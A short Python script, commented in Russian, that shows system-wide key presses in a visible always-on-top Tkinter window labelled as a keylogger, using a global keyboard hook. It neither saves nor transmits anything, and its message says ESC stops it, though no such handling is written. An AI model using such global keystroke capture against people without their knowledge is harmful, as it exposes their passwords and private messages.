import keyboard  # Библиотека для отслеживания нажатий клавиш
import tkinter as tk  # Библиотека для создания GUI
from tkinter import scrolledtext  # Виджет текстового поля с прокруткой

def keylogger():  # Функция создания GUI кейлогера
    # Создание главного окна
    root = tk.Tk()
    root.title("Кейлогер")  # Заголовок окна
    root.geometry("400x300")  # Размер окна
    root.attributes("-topmost", True)#Окно поверх других окон

    # Создание текстового поля с прокруткой
    text_box = scrolledtext.ScrolledText(root, width=50, height=15)
    text_box.pack(pady=10)  # Размещение с отступом

    def on_key_press(event):  # Обработчик нажатий клавиш
        text_box.insert(tk.END, event.name)  # Добавляет название клавиши в конец текста  # Добавляет название клавиши в конец текста
        text_box.see(tk.END)  # Прокручивает текстовое поле к последней записи  # Прокручивает текстовое поле к последней записи
    
    # Регистрируем обработчик нажатий клавиш
    keyboard.on_press(on_key_press)
    text_box.insert(tk.END, "Кейлогер запущен. Нажмите ESC для остановки.\n")

    # Запуск GUI (блокирующий вызов)
    root.mainloop()